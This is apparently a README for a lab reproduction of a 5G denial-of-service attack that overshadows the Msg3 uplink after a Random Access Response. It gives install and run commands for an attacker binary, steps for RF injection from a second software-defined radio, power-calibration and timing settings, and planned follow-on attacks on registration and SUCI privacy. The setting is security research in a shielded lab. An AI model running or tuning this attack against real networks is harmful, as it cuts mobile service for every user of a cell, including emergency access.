# Phase 2 — RAR DoS Attack Demo

Paper: [5Gone Section 4.1](https://arxiv.org/html/2602.10272v1) — Cell-Wide DoS via Msg3 overshadow.

**Authorization:** Shielded lab only. Never test on public cells.

---

## Attack summary

1. UE sends PRACH → gNB responds with **RAR** on DL (PDCCH, RA-RNTI)
2. RAR contains **UL grant** for Msg3 (RRC Setup Request)
3. Attacker decodes RAR, builds **empty MAC PDU** (padding only)
4. Attacker TX PUSCH on same grant, **higher power**, **Symbol0 advance** before UE
5. gNB decodes attacker signal → Msg3 fails → UE cannot attach → cell-wide DoS at scale

---

## Lab topology

```
┌─────────────┐     DL/UL RF      ┌──────────────┐
│ srsRAN gNB  │◄────────────────►│ Shield tent  │
│  B210 #1    │                  │  + test UE   │
└──────┬──────┘                  └──────▲───────┘
       │                                │
       │ Open5GS                        │ overshadow
       ▼                                │
┌─────────────┐                  ┌──────┴───────┐
│ AMF/SMF/UPF │                  │  Attacker    │
└─────────────┘                  │  B210 #2+PA  │
                                 └──────────────┘
```

---

## Install (after Phase 1)

```bash
cd poc/5gone
bash scripts/install-all.sh      # Phase 1 stack
bash scripts/install-phase2.sh   # attacker binary
bash scripts/verify-phase2.sh    # must PASS
```

---

## Demo procedure (office)

### Step 1 — Offline sim (no RF)

```bash
bash scripts/run-attack-rar-dos.sh demo
```

Expected: 10 RAR attacks replayed, log to `/tmp/5gone_attacker.log`.

### Step 2 — Start 5G lab

```bash
bash scripts/start-5g-native.sh core
bash scripts/add-test-subscriber.sh
bash scripts/start-5g-native.sh gnb
```

Verify phone sees cell (attenuator max, inside tent).

### Step 3 — Full attack lab (one command)

```bash
bash scripts/start-attack-lab.sh up     # gNB + sniffer + bus attacker
bash scripts/start-attack-lab.sh status
bash scripts/start-attack-lab.sh down
```

Or manual:

```bash
bash scripts/start-sniffer.sh tail &
bash scripts/run-attack-rar-dos.sh bus   # needs 2nd B210 for real TX
```

### Step 4 — RF inject attack

**Inside RF tent with PA + attenuators:**

```bash
# Identify 2nd B210 serial
uhd_find_devices

export ATTACKER_DEVICE='serial=XXXXX'
bash scripts/run-attack-rar-dos.sh inject phase2/config/sample_grant.json
```

Power calibration:
1. Start with max attenuation (60 dB)
2. Reduce until gNB logs show failed Msg3 / RA timeout
3. Never exceed local EIRP limits outside tent

### Step 4 — Observe success

| Signal | Where to look |
|--------|---------------|
| Attacker TX | `/tmp/5gone_attacker.log` — `Attacking RAR` lines |
| gNB MAC fail | `/tmp/gnb_5gone.log` — RA/Msg3 errors |
| UE behavior | Phone stuck on "connecting" / repeated search |

Compare with dataset: `data/5gone-dataset/cell-wide-dos/`

---

## Grant injection (manual / sniffer handoff)

When live PDCCH decode not yet ready, publish grants manually:

```bash
python3 phase2/python/grant_bus.py publish --crnti 17922 --freq 2 --rapid 5
```

Future: `phase1/sniffer/` writes to `/tmp/5gone_grants.jsonl`.

---

## Timing parameters

| Parameter | Paper (X310 100 MHz) | B210 lab (20 MHz) |
|-----------|---------------------|-------------------|
| Symbol0 advance | ~672–2287 µs | Start 500 µs, tune |
| k (Msg3 offset) | k2=1–6 | 6 in dataset logs |
| E2E latency target | <500 µs | USB: measure yours |

Config: `phase2/config/rar_dos.yaml` → `attack.symbol_advance_us`

---

## Known limitations

| Item | Status |
|------|--------|
| Empty MAC PDU builder | Implemented |
| IQ template PUSCH | Implemented (lab templates) |
| Full NR LDPC/DMRS PUSCH | srsRAN link optional |
| Live PDCCH RAR decode | WIP — use inject mode |
| Single B210 full attack | Not possible (need 2nd SDR) |

---

## Next attacks (Phase 2b+)

1. Registration Reject Downgrade (Section 4.2) — NAS encoding
2. SUCI Extraction (Section 4.3) — UL decoder
3. SUCI Replay (Section 4.4)

Start with RAR DoS success before advancing.
